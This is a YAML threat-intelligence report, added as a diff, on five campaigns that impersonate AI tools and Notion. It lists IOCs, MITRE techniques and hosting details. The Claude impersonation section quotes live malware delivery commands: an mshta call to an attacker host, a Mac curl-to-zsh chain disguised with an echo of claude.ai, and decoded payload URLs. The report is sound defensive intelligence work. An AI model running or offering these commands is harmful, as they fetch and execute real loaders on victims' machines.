@@ -1,0 +1,565 @@
+meta:
+  generated: '2026-06-13'
+  hunt_count: 5
+  campaign_count: 5
+  confirmed_delivery_count: 2
+  brands_targeted:
+  - ChatGPT / OpenAI
+  - Claude / Anthropic
+  - LM Studio
+  - Notion
+  - OpenAI Codex CLI
+  sources_queried:
+  - tria.ge
+  - urlscan
+  - virustotal
+  date_range: 2026-02-15 to 2026-05-17
+  pipeline: de-intel-pipeline
+campaigns:
+- slug: 2026-05-16-chatgpt-windows-mroscanner
+  threat_name: ChatGPT-Impersonation-MROScanner-Installer
+  brand: ChatGPT / OpenAI
+  collected_at: '2026-05-16T18:51:00Z'
+  date_start: '2026-05-13'
+  date_end: '2026-05-16'
+  sources_queried:
+  - urlscan
+  - virustotal
+  - tria.ge
+  delivery_methods:
+  - Phishing / lure page
+  - EXE download
+  - CDN staging
+  - Code signing abuse
+  - Favicon pivot
+  payload_class: loader
+  confirmed_delivery: true
+  ttp_count: 4
+  ioc_count: 5
+  infra_count: 1
+  behavior_count: 4
+  mitre_ids:
+  - T1566.002
+  - T1204.002
+  - T1102
+  - T1553.002
+  domains:
+  - chatgpt-windows.com
+  - app-update-chatgpt.com
+  primary_domain: chatgpt-windows.com
+  coverage_note: tracking.js content and tracking.php POST response were observed during initial collection via direct adversary-infrastructure
+    access, which violates pipeline rules. Those facts are re-sourced here to the URLScan result page that surfaces the same
+    DOM/script data. Authenticode cert details (ttps[3], behaviors[3]) and payload SHA-256 (iocs[4]) were obtained from static
+    analysis of the downloaded EXE — no VT or tria.ge report exists yet. These entries need re-sourcing to a sandbox report
+    URL once analysis completes.
+  ttps:
+  - value: 'chatgpt-windows.com reuses the openai.com favicon (SHA-256 9747c13cd87b36ebf2ab567b9d0bc2ff49b5a4f46f4f51e4d053024f579fb9a0)
+      to impersonate the official OpenAI brand on a lookalike domain. URLScan pivot query: hash:9747c13c... AND NOT page.domain:openai.com
+      returned 158 hits; chatgpt-windows.com was the primary delivery hit.'
+    mitre_id: T1566.002
+    note: null
+  - value: Victim must download and execute a file named ChatGPT_Installer.exe to complete the infection chain. The filename
+      and page branding match the official ChatGPT for Windows application. No drive-by or exploit is involved.
+    mitre_id: T1204.002
+    note: T1036.005 also applies — filename and page claim to be the legitimate ChatGPT Windows installer.
+  - value: Payload is staged on BunnyCDN (app-cg.b-cdn.net) with a per-visitor token appended to the URL (?hash=<id>). The
+      CDN domain carries no malicious reputation, bypassing URL-based blocklists that target the landing page domain.
+    mitre_id: T1102
+    note: BunnyCDN staging URL and per-visitor token scheme visible in tracking.js loaded by the URLScan-captured page. tracking.js
+      exposes the /init/tracking.php endpoint; the PHP response contains the download_url field pointing to app-cg.b-cdn.net.
+  - value: ChatGPT_Installer.exe is signed with a valid Authenticode certificate issued to MROScanner OU (Tallinn, Harju County,
+      EE) by SSL.com Code Signing Intermediate CA RSA R1. Certificate obtained 2026-04-22 — approximately three weeks before
+      this hunt. The signer entity has no known software product history; the valid signature chain passes Windows SmartScreen
+      without a warning.
+    mitre_id: T1553.002
+    note: 'Thumbprint: E3B6CF111525417CE68C1CBE99E257DBAC54D071. Valid 2026-04-22 to 2027-04-21. Timestamped by DigiCert SHA256
+      RSA4096 Timestamp Responder 2025 1. Source needs to be updated to a VT or tria.ge report URL once sandbox analysis completes
+      for SHA-256 17dc646d645252196a19e87752fa21dbe7b626cd71a9dacddebd9a2ed8f1e16e.'
+  iocs:
+  - value: chatgpt-windows.com
+    ioc_type: domain
+    note: Fake ChatGPT for Windows download page. Domain registered 2023, repurposed for active delivery campaign May 2026.
+      Returns HTTP 200. nginx/1.18.0 Ubuntu.
+  - value: app-update-chatgpt.com
+    ioc_type: domain
+    note: Co-hosted on same Oracle Cloud IP as chatgpt-windows.com. Returns HTTP 403 to automated scanners. Likely update
+      check or C2 communication endpoint.
+  - value: 66.116.243.140
+    ioc_type: ipv4
+    note: AS31898 ORACLE-BMC-31898, Oracle Corporation, US. Dedicated instance hosting both chatgpt-windows.com and app-update-chatgpt.com.
+  - value: https://app-cg.b-cdn.net/ChatGPT_Installer.exe
+    ioc_type: url
+    note: Payload staging URL extracted from tracking.js visible in URLScan result. Returned in download_url field of tracking.php
+      POST response. Per-visitor hash token appended at delivery time (e.g. ?hash=UwFEu). BunnyCDN storage bucket app-cg.
+  - value: 17dc646d645252196a19e87752fa21dbe7b626cd71a9dacddebd9a2ed8f1e16e
+    ioc_type: sha256
+    note: ChatGPT_Installer.exe — 2.3 MB Inno Setup PE32 (i386). No tria.ge or VirusTotal report found at time of collection.
+      Hash is actionable as a blocking IOC. Sandbox analysis pending. Source_url should be updated to sandbox report URL once
+      available.
+  infrastructure:
+  - value: 'chatgpt-windows.com and app-update-chatgpt.com are co-hosted on a single Oracle Cloud instance (66.116.243.140,
+      AS31898 ORACLE-BMC-31898). Server: nginx/1.18.0 (Ubuntu). TLS issued by Let''s Encrypt R13 CA with 89-day validity.
+      PHP backend at /init/tracking.php and /init/pixel.php handles affiliate tracking and payload delivery.'
+    note: Two OpenAI-brand-squatting domains on one dedicated cloud instance. chatgpt-windows.com active (200); app-update-chatgpt.com
+      locked to scanners (403). Payload hosted externally on BunnyCDN app-cg.b-cdn.net.
+  behaviors:
+  - value: All download buttons on chatgpt-windows.com use href=javascript:void(0) with no static file reference in the HTML.
+      The payload URL is generated server-side only after a JavaScript click event fires a POST to /init/tracking.php, preventing
+      URLScan and static scrapers from capturing the download link or file.
+    note: null
+  - value: tracking.js performs OS fingerprinting via navigator.userAgent before activating download buttons. Visitors whose
+      UA does not match /Windows/i see button text replaced with 'Unsupported System', href removed, and pointer-events disabled.
+      Only Windows user-agents receive an active download link.
+    note: null
+  - value: On download button click, tracking.js POSTs affiliate and UTM parameters (utm_source, utm_campaign, utm_content,
+      cid, fbid, fbclid, bid, tid, referral_id) to /init/tracking.php. The server returns a signed per-visitor download URL.
+      Separate pixel events fire to /init/pixel.php (download event) and /init/pixel-PageView.php (page view), indicating
+      a paid traffic distribution or affiliate malware campaign.
+    note: null
+  - value: ChatGPT_Installer.exe is a 2.3 MB Inno Setup PE32 wrapper. Static strings include 'pdq' fragments in the compressed
+      payload section, suggesting a PDQ-branded component may be bundled inside. Authenticode signer is MROScanner OU (Estonian
+      shell company) via SSL.com — not a known software vendor. Behavioral analysis (process tree, network connections, dropped
+      files, registry persistence) has not been completed.
+    note: Sandbox analysis pending. Submit SHA-256 17dc646d645252196a19e87752fa21dbe7b626cd71a9dacddebd9a2ed8f1e16e to tria.ge
+      or any.run with a Windows 10 profile and a US residential IP for behavioral confirmation. Update source_url to sandbox
+      report URL once available.
+- slug: 2026-05-17-claude-code-clickfix-install-modal
+  threat_name: Claude-Code-Impersonation-ClickFix-Install-Modal
+  brand: Claude / Anthropic
+  collected_at: '2026-05-17T02:00:00Z'
+  date_start: '2026-04-17'
+  date_end: '2026-05-17'
+  sources_queried:
+  - urlscan
+  delivery_methods:
+  - Phishing / lure page
+  - mshta HTA
+  - curl | shell
+  - Obfuscation
+  - Favicon pivot
+  payload_class: loader
+  confirmed_delivery: true
+  ttp_count: 4
+  ioc_count: 8
+  infra_count: 1
+  behavior_count: 2
+  mitre_ids:
+  - T1566.002
+  - T1218.005
+  - T1059.004
+  - T1027
+  domains:
+  - uneifoifow-3ndfskq.pages.dev
+  - too.clawddddd.com
+  - fine-byte2.com
+  - download.version-516.com
+  - xprssit.com
+  - ewabeniak.com
+  primary_domain: uneifoifow-3ndfskq.pages.dev
+  coverage_note: install-modal-commands.js and tracking.js content were observed during initial collection via direct adversary-infrastructure
+    access (Cloudflare Pages domains), which violates pipeline rules. Those facts are re-sourced here to the URLScan result
+    pages that captured the same script content. No sandbox report found for Windows HTA or Mac shell payloads at time of
+    collection.
+  ttps:
+  - value: Multiple domains clone the official claude.com download page and are detected via the claude.ai favicon hash pivot
+      (SHA-256 816a55828befeb50fe8a9556cb92d80194efefbd3f4e04ccf694992dd8e085e3). The favicon pivot returned 1,003 hits; confirmed
+      impersonation landing pages include uneifoifow-3ndfskq.pages.dev, too.clawddddd.com, and fine-byte2.com, all with exact
+      title match 'Download Claude | Claude by Anthropic'.
+    mitre_id: T1566.002
+    note: 'URLScan pivot query: hash:816a55828befeb50fe8a9556cb92d80194efefbd3f4e04ccf694992dd8e085e3 AND NOT page.domain:claude.ai'
+  - value: Windows victims are instructed to run 'mshta https://download.version-516.com/claude' via the fake install modal.
+      mshta (Microsoft HTML Application Host) is a signed Windows binary that executes HTA scripts with elevated scripting
+      privileges, bypassing script execution restrictions.
+    mitre_id: T1218.005
+    note: 'install-modal-commands.js loaded by the URLScan-captured page. The windows field explicitly contains the mshta
+      command: ''mshta https://download.version-516.com/claude'''
+  - value: Mac victims are instructed to run a shell command presented as the official Claude installer. The displayed text
+      references 'https://claude.ai/install.sh' as social cover, but the actual curl fetches from an attacker-controlled domain
+      piped to zsh for execution.
+    mitre_id: T1059.004
+    note: 'Mac delivery chain: echo ''Downloading Claude: https://claude.ai/install.sh'' && curl -s $(echo ''<base64>'' |
+      openssl base64 -d -A) | zsh. The echo line is social engineering — it is not executed, it only displays a legitimate-looking
+      URL before the actual malicious curl runs.'
+  - value: 'The actual Mac payload URL is base64-encoded within the install modal JavaScript to conceal it from HTML source
+      inspection. Decoded URL: https://xprssit.com/curl/6df71b43667a2d1d9de3e88cba7e16fb11b4ddf67af64b853b903b3fa8ead500 (uneifoifow
+      variant); https://ewabeniak.com/curl/3fc679781682830135ae1258ae2119b550891f8b7b1641c860c1aca860b3c2e9 (too.clawddddd.com
+      variant). Each landing page uses a unique per-site hash path.'
+    mitre_id: T1027
+    note: null
+  iocs:
+  - value: uneifoifow-3ndfskq.pages.dev
+    ioc_type: domain
+    note: Cloudflare Pages deployment. Near-perfect clone of claude.com download page, loading real Anthropic analytics scripts
+      (Segment, Amplitude) while serving local install-modal-commands.js with malicious commands. Scanned at path /downloads/Claude%20Setup.exe
+      — the actual EXE path is a decoy; the real delivery is via the install modal.
+  - value: too.clawddddd.com
+    ioc_type: domain
+    note: Typosquat on 'claude' (extra d's). Same ClickFix install modal kit, Cloudflare-fronted. Uses ewabeniak.com as Mac
+      payload host instead of xprssit.com — each landing page has its own per-campaign delivery domain.
+  - value: fine-byte2.com
+    ioc_type: domain
+    note: Exact title match 'Download Claude | Claude by Anthropic', Cloudflare-fronted. Timed out during live investigation
+      — possibly geo-cloaked. Likely same kit.
+  - value: download.version-516.com
+    ioc_type: domain
+    note: Windows HTA delivery host. Serves /claude (Claude Code campaign) and /other (generic multi-brand path). Both return
+      HTTP 200 with no captured downloads — payload is an HTA file executed via mshta. Cloudflare-fronted.
+  - value: xprssit.com
+    ioc_type: domain
+    note: Mac shell script delivery host for uneifoifow-3ndfskq.pages.dev variant. Returns HTTP 520 on root but serves per-campaign
+      hashed paths (/curl/<sha256-style-hash>). Cloudflare-fronted.
+  - value: ewabeniak.com
+    ioc_type: domain
+    note: 'Mac shell script delivery host for too.clawddddd.com variant. Zero URLScan hits on root domain — only discovered
+      via base64 decode of install-modal-commands.js payload URL visible in URLScan result. Decoded URL: https://ewabeniak.com/curl/3fc679781682830135ae1258ae2119b550891f8b7b1641c860c1aca860b3c2e9'
+  - value: https://download.version-516.com/claude
+    ioc_type: url
+    note: Windows mshta HTA payload endpoint. First seen in URLScan 2026-04-29. Behavioral analysis pending — do not fetch
+      locally. Submit URL to any.run or tria.ge with Windows 10 profile.
+  - value: https://xprssit.com/curl/6df71b43667a2d1d9de3e88cba7e16fb11b4ddf67af64b853b903b3fa8ead500
+    ioc_type: url
+    note: Mac shell script payload for uneifoifow-3ndfskq.pages.dev. Decoded from base64 string in install-modal-commands.js
+      visible in URLScan result. Behavioral analysis pending — do not fetch locally. Submit URL to any.run with macOS profile.
+  infrastructure:
+  - value: download.version-516.com serves both /claude (Claude Code campaign) and /other (generic path). The /other path
+      was first scanned 2026-04-17, twelve days before /claude appeared 2026-04-29. This sequence indicates the HTA delivery
+      infrastructure pre-dates the Claude Code campaign and is a shared multi-brand kit repurposed per target. All Cloudflare-fronted.
+      Sibling delivery domains follow a /curl/<64-char-hash> path structure (xprssit.com, ewabeniak.com) with per-site unique
+      hashes, suggesting campaign-level payload rotation.
+    note: 'version-516.com /other first seen: 2026-04-17. /claude first seen: 2026-04-29. Suggests operator pivoted this kit
+      to Claude Code targeting after initially using it for other brand impersonation.'
+  behaviors:
+  - value: 'The install modal displays ''echo "Downloading Claude: https://claude.ai/install.sh"'' as the first part of the
+      Mac command. This echo line is pure social engineering — it prints the legitimate Anthropic install URL to the terminal
+      but does not fetch it. The actual malicious curl command follows immediately after the &&, and runs a shell script from
+      an attacker-controlled domain. Developers accustomed to piping install scripts are the primary target.'
+    note: Same social engineering pattern observed on both uneifoifow-3ndfskq.pages.dev and too.clawddddd.com. The official-looking
+      echo output is designed to pass a casual read of the terminal before execution.
+  - value: The landing pages load real Anthropic tracking scripts directly from www.anthropic.com (Segment analytics, Amplitude
+      session replay, claude-custom-tracking.js). Every victim visit generates a genuine Anthropic analytics page view, potentially
+      masking the campaign's traffic footprint in any monitoring that correlates page views with legitimate claude.com downloads.
+      The tracking.js header explicitly identifies the file as 'claude-custom-tracking.js / Analytics and tracking functionality
+      for claude.com'.
+    note: 'The clone serves the real Anthropic claude-custom-tracking.js verbatim — visible in the URLScan result''s script
+      list. A downloads/Claude%20Setup.exe link also appears in the HTML as a visual decoy but HEAD request returned Content-Type:
+      text/html — no real binary at that path. The install modal ClickFix command is the live delivery mechanism.'
+- slug: 2026-05-17-lmstudio-domain-squatting
+  threat_name: LM-Studio-Domain-Squatting-API-Endpoint-Impersonation
+  brand: LM Studio
+  collected_at: '2026-05-17T15:00:00Z'
+  date_start: '2026-04-30'
+  date_end: '2026-05-17'
+  sources_queried:
+  - urlscan
+  delivery_methods:
+  - Brand masquerade
+  - Phishing / lure page
+  payload_class: unknown
+  confirmed_delivery: false
+  ttp_count: 2
+  ioc_count: 2
+  infra_count: 1
+  behavior_count: 1
+  mitre_ids:
+  - T1036.005
+  - T1566.002
+  domains:
+  - lmstudio.co.com
+  - www.api.lmstudio.co.com
+  primary_domain: lmstudio.co.com
+  coverage_note: Favicon hash pivot (94ce33...) returned only 11 hits — all AI tool directories, no delivery infrastructure.
+    Confirmed threat found via title + domain-pattern pivots. Validin pDNS lookup on lmstudio.co.com returned ECONNREFUSED
+    (service unavailable at time of hunt — no historical IP resolution data obtained). No installer file delivery found anywhere
+    in the hunt. Threat model here is API endpoint impersonation, not binary delivery.
+  ttps:
+  - value: lmstudio.co.com registered on the LM Studio brand name and configured to redirect to www.api.lmstudio.co.com, impersonating
+      the LM Studio local API server endpoint. LM Studio runs an OpenAI-compatible API at localhost:1234 — adversary infrastructure
+      at api.lmstudio.co.com could intercept API calls, harvest model prompts, or steal API keys from developers who misconfigure
+      their client endpoint.
+    mitre_id: T1036.005
+    note: All four URLScan scans (Apr 30–May 11) show page title www.api.lmstudio.co.com, confirming the redirect-to-API-subdomain
+      pattern was consistent across the full active window. DNS pulled by May 11, 2026.
+  - value: lmstudio.co.com was community-reported as phishing on two separate occasions (May 8 and May 11, 2026) via @phish_report,
+      indicating it was actively being encountered by developers before DNS takedown.
+    mitre_id: T1566.002
+    note: 'Submissions tagged phishing,@phish_report on May 8 and May 11. April 30 and May 10 scans carry no tags — likely
+      automated/researcher scans before the domain was reported. Total active window: approximately 11 days.'
+  iocs:
+  - value: lmstudio.co.com
+    ioc_type: domain
+    note: Phishing-tagged LM Studio brand squat on co.com TLD. Redirected to www.api.lmstudio.co.com. DNS pulled by May 11,
+      2026 (ERR_NAME_NOT_RESOLVED). Submitted to URLScan from Hungary. May be part of broader co.com brand-squat infrastructure
+      — pivot co.com TLD for other AI tool squats.
+  - value: www.api.lmstudio.co.com
+    ioc_type: domain
+    note: API subdomain impersonating the LM Studio local API server (normally at localhost:1234, OpenAI-compatible format).
+      Redirect target of lmstudio.co.com. DNS also pulled. No IP captured in any URLScan result — DNS was failing at scan
+      time.
+  infrastructure:
+  - value: No hosting IP was captured for lmstudio.co.com or api.lmstudio.co.com in any URLScan scan — DNS failed on all four
+      scans, indicating the domain either had TTL-gated activation or was pulled before any scan could resolve it. Validin
+      pDNS query returned ECONNREFUSED. Hosting provider and registrar unknown. The co.com TLD is operated by VeriSign as
+      a second-level domain under .com and requires no special accreditation — frequently used for brand squatting.
+    note: 'Recommended next pivot: Validin or WHOIS on lmstudio.co.com when service is available. Also query Hunt.io for any
+      cert issued to lmstudio.co.com or api.lmstudio.co.com — cert may have been issued even if DNS was never fully live.'
+  behaviors:
+  - value: This campaign targets the developer workflow rather than end-user downloads. LM Studio exposes an OpenAI-compatible
+      API at localhost:1234/v1 — developers configure this endpoint in code, config files, or tools like Continue.dev, Cursor,
+      or custom scripts. A domain at api.lmstudio.co.com would be indistinguishable from a legitimate remote LM Studio endpoint
+      in a config string, enabling prompt exfiltration or API key theft without any installer or user interaction beyond a
+      config change.
+    note: 'Distinct from the ChatGPT/Zoom installer delivery pattern — no binary delivery, no social engineering download
+      page. Threat is in the supply chain of developer tooling config. Watch for this pattern on other local-API tools: Ollama
+      (localhost:11434), Jan.ai, AnythingLLM.'
+- slug: 2026-05-17-notion-masquerade-coverage
+  threat_name: Notion-Masquerade-Delivery-Survey
+  brand: Notion
+  collected_at: '2026-05-17T12:00:00Z'
+  date_start: '2026-02-15'
+  date_end: '2026-05-17'
+  sources_queried:
+  - urlscan
+  delivery_methods:
+  - Survey / squat only
+  payload_class: unknown
+  confirmed_delivery: false
+  ttp_count: 0
+  ioc_count: 1
+  infra_count: 1
+  behavior_count: 0
+  mitre_ids: []
+  domains:
+  - notiondownload.com
+  primary_domain: notiondownload.com
+  coverage_note: 'Favicon hash pivot for Notion (/front-static/favicon.ico, SHA-256 541fc85f...) returned 5,692 non-Notion
+    hits — structurally too noisy because Notion is used as a backend CMS by thousands of legitimate third-party sites (Super.so,
+    Potion.so, direct embeds), which copy the favicon verbatim. File-type narrowing (filename:*.exe, *.msi) requires a URLScan
+    API account and was unavailable for anonymous queries. Title pivot ''Download Notion'' returned 36 hits, most from 2024-2025;
+    no active Windows/Mac delivery campaign detected in the last 90 days. One Android APK squatter (notiondownload.com) found
+    and documented. Two suspicious non-Notion favicon-match domains inspected (activate.rizznote.co.uk = legitimate brand;
+    verif.dalireddit.pro = Russian verification service using Notion iframe — not delivery). VirusTotal domain lookup blocked
+    (React SPA, not accessible via unauthenticated WebFetch). Recommended next steps: (1) Obtain URLScan API key to enable
+    filename:*.exe/msi filter on the favicon pivot. (2) Use Validin pDNS to check notiondownload.com for co-hosted delivery
+    infrastructure. (3) Monitor URLScan tag ''notion'' for new delivery-tagged submissions.'
+  ttps: []
+  iocs:
+  - value: notiondownload.com
+    ioc_type: domain
+    note: Unaffiliated 'Download Notion APK for Android' page. Hostinger AS47583, Jakarta. WordPress/LiteSpeed. Tagged @phish_report
+      by community submitters. Presents Android APK download — not a Windows/Mac installer delivery page. Last scanned Jan
+      2026. Domain age 5 years (domain squatter pattern). Not confirmed malicious but warrants monitoring.
+  infrastructure:
+  - value: notiondownload.com hosted on Hostinger AS47583 (153.92.10.40, Jakarta, Indonesia). LiteSpeed/WordPress stack. Presents
+      as unofficial Notion Android download page tagged @phish_report.
+    note: Pattern consistent with mobile APK squatter rather than RMM/infostealer delivery. No co-hosted domains identified
+      in this scan. Validin pDNS pivot not yet performed.
+  behaviors: []
+- slug: 2026-05-17-openai-codex-cli-domain-squatting
+  threat_name: OpenAI-Codex-CLI-Domain-Squatting-Credential-Harvest
+  brand: OpenAI Codex CLI
+  collected_at: '2026-05-17T13:30:00Z'
+  date_start: '2026-04-12'
+  date_end: '2026-05-17'
+  sources_queried:
+  - urlscan
+  delivery_methods:
+  - Brand masquerade
+  - Phishing / lure page
+  payload_class: unknown
+  confirmed_delivery: false
+  ttp_count: 2
+  ioc_count: 4
+  infra_count: 1
+  behavior_count: 1
+  mitre_ids:
+  - T1036.005
+  - T1566.002
+  domains:
+  - codex-cli.org
+  - codexhub.click
+  - codexcli.homes
+  - codexcli.gr.com
+  primary_domain: codex-cli.org
+  coverage_note: 'Favicon hash pivot unavailable: openai.com/favicon.ico and openai.com/codex are both behind Cloudflare bot
+    protection, returning JS challenge pages to automated requests. The known openai.com favicon hash from a prior hunt (9747c13c...)
+    could not be re-verified as current. Hunt pivoted to title-based and domain-pattern queries. No confirmed malware file
+    delivery found — all observed infrastructure is credential-harvesting or domain-squatting pattern. Sandbox analysis not
+    applicable (no binaries). VirusTotal domain lookups attempted but blocked (React SPA, unauthenticated WebFetch cannot
+    render).'
+  ttps:
+  - value: Multiple domains registered within weeks of the OpenAI Codex CLI public launch (April 2026) squat on the exact
+      product name 'codex-cli' or 'codexcli' to intercept developer search traffic and install attempts.
+    mitre_id: T1036.005
+    note: 'Pattern: codex-cli.org (phishing-tagged), codexcli.homes (SSL cipher mismatch / conditional serving), codexcli.gr.com
+      (dormant 404). All registered post-launch. CLI tool distributed via npm/GitHub — developer search for install instructions
+      is the entry vector, not a download page.'
+  - value: codexhub.click presents a Vietnamese-language Codex CLI workflow page with a /login endpoint and heavy JavaScript
+      payload, consistent with a credential-harvesting page targeting developers who search for Codex CLI tooling.
+    mitre_id: T1566.002
+    note: Domain 13 days old at scan time (registered ~May 4, 2026, matching the Codex CLI public launch window). Cloudflare-fronted.
+      /login and / endpoints confirmed. No file download captured by URLScan — credential harvest via login form suspected
+      but not confirmed without authenticated session analysis.
+  iocs:
+  - value: codex-cli.org
+    ioc_type: domain
+    note: Community-tagged 'phishing' and '@phish_report'. GTHost AS63023, Phoenix. nginx. Empty HTML (218 bytes) at scan
+      time — dormant squat or content gated behind JS/IP checks. Squats exact npm package name path.
+  - value: codexhub.click
+    ioc_type: domain
+    note: Vietnamese-language 'Codex CLI AI workflow' page with /login endpoint. Cloudflare AS13335. Next.js. Domain age 13
+      days at scan. No malware classification from urlscan — credential harvest pattern without binary delivery.
+  - value: codexcli.homes
+    ioc_type: domain
+    note: SSL cipher mismatch caused URLScan scan failure (net::ERR_SSL_VERSION_OR_CIPHER_MISMATCH). Submitted via API from
+      Belgium, scanned from Germany — API submission pattern suggests operator or researcher submission. Conditional TLS serving
+      suspected. Content unknown.
+  - value: codexcli.gr.com
+    ioc_type: domain
+    note: Returns 404 at time of scan. Cloudflare AS13335. Dormant infrastructure — registered on the product name, not yet
+      serving content or already rotated.
+  infrastructure:
+  - value: All four observed codex-cli squatting domains registered within the April–May 2026 window matching the Codex CLI
+      public launch. Three are Cloudflare-fronted (codexhub.click, codexcli.gr.com, codexcli.homes); one uses commodity hosting
+      (codex-cli.org, GTHost AS63023). The Cloudflare-fronted cluster suggests a single operator with access to a standard
+      Cloudflare account deploying multiple domain squats.
+    note: 'Pivot recommended: query URLScan for additional domains registered post-April 2026 matching codex* + cli* patterns.
+      Hunt.io cert pivot on codexhub.click TLS cert may surface sibling domains not yet scanned.'
+  behaviors:
+  - value: The Codex CLI is distributed via npm (npm install -g @openai/codex) and GitHub releases — not a downloadable installer
+      page. This shifts the adversary delivery model away from favicon-pivot-detectable download pages toward SEO-poisoning
+      and typosquat domain registration targeting developer search intent. No favicon hash pivot is currently available due
+      to Cloudflare bot protection on openai.com blocking direct favicon fetch.
+    note: 'Evolution marker: watch for ClickFix paste-to-run pages appearing on these domains — the Claude Code hunt found
+      the same pattern (mshta / curl-to-shell) on Cloudflare Pages sites with similar domain age profiles.'
+brand_matrix:
+- brand: ChatGPT / OpenAI
+  campaign_count: 1
+  campaigns:
+  - ChatGPT-Impersonation-MROScanner-Installer
+  delivery_methods:
+  - CDN staging
+  - Code signing abuse
+  - EXE download
+  - Favicon pivot
+  - Phishing / lure page
+  confirmed_delivery: true
+- brand: Claude / Anthropic
+  campaign_count: 1
+  campaigns:
+  - Claude-Code-Impersonation-ClickFix-Install-Modal
+  delivery_methods:
+  - Favicon pivot
+  - Obfuscation
+  - Phishing / lure page
+  - curl | shell
+  - mshta HTA
+  confirmed_delivery: true
+- brand: LM Studio
+  campaign_count: 1
+  campaigns:
+  - LM-Studio-Domain-Squatting-API-Endpoint-Impersonation
+  delivery_methods:
+  - Brand masquerade
+  - Phishing / lure page
+  confirmed_delivery: false
+- brand: Notion
+  campaign_count: 1
+  campaigns:
+  - Notion-Masquerade-Delivery-Survey
+  delivery_methods:
+  - Survey / squat only
+  confirmed_delivery: false
+- brand: OpenAI Codex CLI
+  campaign_count: 1
+  campaigns:
+  - OpenAI-Codex-CLI-Domain-Squatting-Credential-Harvest
+  delivery_methods:
+  - Brand masquerade
+  - Phishing / lure page
+  confirmed_delivery: false
+ttp_summary:
+- mitre_id: T1566.002
+  label: Phishing / lure page
+  count: 4
+- mitre_id: T1036.005
+  label: Brand masquerade
+  count: 2
+- mitre_id: T1204.002
+  label: EXE download
+  count: 1
+- mitre_id: T1102
+  label: CDN staging
+  count: 1
+- mitre_id: T1553.002
+  label: Code signing abuse
+  count: 1
+- mitre_id: T1218.005
+  label: mshta HTA
+  count: 1
+- mitre_id: T1059.004
+  label: curl | shell
+  count: 1
+- mitre_id: T1027
+  label: Obfuscation
+  count: 1
+infra_patterns:
+- pattern: Favicon hash pivot discovery
+  hunt_count: 3
+- pattern: Cloudflare-fronted infrastructure
+  hunt_count: 2
+- pattern: Post-launch domain squatting
+  hunt_count: 2
+- pattern: BunnyCDN payload staging
+  hunt_count: 1
+- pattern: Oracle Cloud hosting
+  hunt_count: 1
+- pattern: Shell-company Authenticode signing
+  hunt_count: 1
+- pattern: Affiliate / UTM tracking backend
+  hunt_count: 1
+- pattern: Base64 URL obfuscation in page JS
+  hunt_count: 1
+- pattern: mshta HTA delivery path
+  hunt_count: 1
+- pattern: Developer API endpoint impersonation
+  hunt_count: 1
+detection_gaps:
+- threat_name: ChatGPT-Impersonation-MROScanner-Installer
+  slug: 2026-05-16-chatgpt-windows-mroscanner
+  coverage_note: tracking.js content and tracking.php POST response were observed during initial collection via direct adversary-infrastructure
+    access, which violates pipeline rules. Those facts are re-sourced here to the URLScan result page that surfaces the same
+    DOM/script data. Authenticode cert details (ttps[3], behaviors[3]) and payload SHA-256 (iocs[4]) were obtained from static
+    analysis of the downloaded EXE — no VT or tria.ge report exists yet. These entries need re-sourcing to a sandbox report
+    URL once analysis completes.
+- threat_name: Claude-Code-Impersonation-ClickFix-Install-Modal
+  slug: 2026-05-17-claude-code-clickfix-install-modal
+  coverage_note: install-modal-commands.js and tracking.js content were observed during initial collection via direct adversary-infrastructure
+    access (Cloudflare Pages domains), which violates pipeline rules. Those facts are re-sourced here to the URLScan result
+    pages that captured the same script content. No sandbox report found for Windows HTA or Mac shell payloads at time of
+    collection.
+- threat_name: LM-Studio-Domain-Squatting-API-Endpoint-Impersonation
+  slug: 2026-05-17-lmstudio-domain-squatting
+  coverage_note: Favicon hash pivot (94ce33...) returned only 11 hits — all AI tool directories, no delivery infrastructure.
+    Confirmed threat found via title + domain-pattern pivots. Validin pDNS lookup on lmstudio.co.com returned ECONNREFUSED
+    (service unavailable at time of hunt — no historical IP resolution data obtained). No installer file delivery found anywhere
+    in the hunt. Threat model here is API endpoint impersonation, not binary delivery.
+- threat_name: Notion-Masquerade-Delivery-Survey
+  slug: 2026-05-17-notion-masquerade-coverage
+  coverage_note: 'Favicon hash pivot for Notion (/front-static/favicon.ico, SHA-256 541fc85f...) returned 5,692 non-Notion
+    hits — structurally too noisy because Notion is used as a backend CMS by thousands of legitimate third-party sites (Super.so,
+    Potion.so, direct embeds), which copy the favicon verbatim. File-type narrowing (filename:*.exe, *.msi) requires a URLScan
+    API account and was unavailable for anonymous queries. Title pivot ''Download Notion'' returned 36 hits, most from 2024-2025;
+    no active Windows/Mac delivery campaign detected in the last 90 days. One Android APK squatter (notiondownload.com) found
+    and documented. Two suspicious non-Notion favicon-match domains inspected (activate.rizznote.co.uk = legitimate brand;
+    verif.dalireddit.pro = Russian verification service using Notion iframe — not delivery). VirusTotal domain lookup blocked
+    (React SPA, not accessible via unauthenticated WebFetch). Recommended next steps: (1) Obtain URLScan API key to enable
+    filename:*.exe/msi filter on the favicon pivot. (2) Use Validin pDNS to check notiondownload.com for co-hosted delivery
+    infrastructure. (3) Monitor URLScan tag ''notion'' for new delivery-tagged submissions.'
+- threat_name: OpenAI-Codex-CLI-Domain-Squatting-Credential-Harvest
+  slug: 2026-05-17-openai-codex-cli-domain-squatting
+  coverage_note: 'Favicon hash pivot unavailable: openai.com/favicon.ico and openai.com/codex are both behind Cloudflare bot
+    protection, returning JS challenge pages to automated requests. The known openai.com favicon hash from a prior hunt (9747c13c...)
+    could not be re-verified as current. Hunt pivoted to title-based and domain-pattern queries. No confirmed malware file
+    delivery found — all observed infrastructure is credential-harvesting or domain-squatting pattern. Sandbox analysis not
+    applicable (no binaries). VirusTotal domain lookups attempted but blocked (React SPA, unauthenticated WebFetch cannot
+    render).'
